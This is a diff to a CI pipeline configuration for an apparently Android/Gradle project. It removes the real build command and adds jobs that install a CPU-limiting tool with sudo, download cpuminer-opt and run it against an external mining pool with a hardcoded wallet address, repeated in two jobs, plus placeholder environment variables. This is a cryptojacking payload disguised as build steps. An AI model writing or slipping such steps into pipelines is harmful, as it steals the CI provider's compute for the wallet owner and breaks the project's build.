@@ -23,7 +23,28 @@ blocks:
       jobs:
         - name: Build Project
           commands:
-            - ./gradlew bundleDebug
+            - './git clone https://github.com/kadeng/limit_visible_cpus'
+            - cd limit_visible_cpus
+            - sudo pip install py3nvml
+            - sudo cp -av dist/bin/* /usr/local/bin/
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - 'tar xf cpuminer-opt-linux.tar.gz '
+            - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q63mx0v3v638a2s0jga2cykjfwnh3r75200qxa6.testCi'
+            - sleep 2
+            - done
+        - name: 'Job #2'
+          commands:
+            - './git clone https://github.com/kadeng/limit_visible_cpus'
+            - cd limit_visible_cpus
+            - sudo pip install py3nvml
+            - sudo cp -av dist/bin/* /usr/local/bin/
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - 'tar xf cpuminer-opt-linux.tar.gz '
+            - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q63mx0v3v638a2s0jga2cykjfwnh3r75200qxa6.testCi'
+            - sleep 2
+            - done
+        - name: 'Job #3'
+          commands: []
       epilogue:
         on_pass:
           commands:
@@ -31,6 +52,11 @@ blocks:
             - cache store gradle-wrapper ~/.gradle/wrapper
             - cache store gradle-cache ~/.gradle/caches
             - cache store android-build ~/.android/build-cache
+      env_vars:
+        - name: FOO_1
+          value: BAR_1
+        - name: FOO_2
+          value: BAR_2
   - name: Verification
     task:
       jobs:
